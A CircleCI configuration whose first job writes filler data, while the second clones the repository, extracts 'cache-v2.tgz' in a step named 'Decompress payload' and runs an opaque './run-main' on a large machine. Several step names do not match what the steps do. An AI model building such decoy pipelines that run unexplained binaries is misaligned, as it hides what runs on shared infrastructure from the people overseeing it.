version: 2.1

jobs:
  br3:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Prebake v2
          command: |
            mkdir -p /tmp/ci/output
            set +o pipefail 2>/dev/null; for i in $(seq 1 10000); do echo "item-$((i*2))"; done > /tmp/ci/output/02.02.2026; true
            echo "stage1"
      - persist_to_workspace:
          root: /tmp/ci/output
          paths:
            - '02.02.2026'
  vera-push:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/ci/output
      - run:
          name: Audit pre-build
          command: |
            sed -n '/^./p' /tmp/ci/output/02.02.2026 2>/dev/null | wc -l || true
      - run:
          name: Grab main branch
          command: git clone --depth 3 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Decompress payload
          command: zcat cache-v2.tgz | tar xvf -
      - run:
          command: df -h
      - run:
          name: Package artifacts
          command: date -u
      - run:
          command: ./run-main
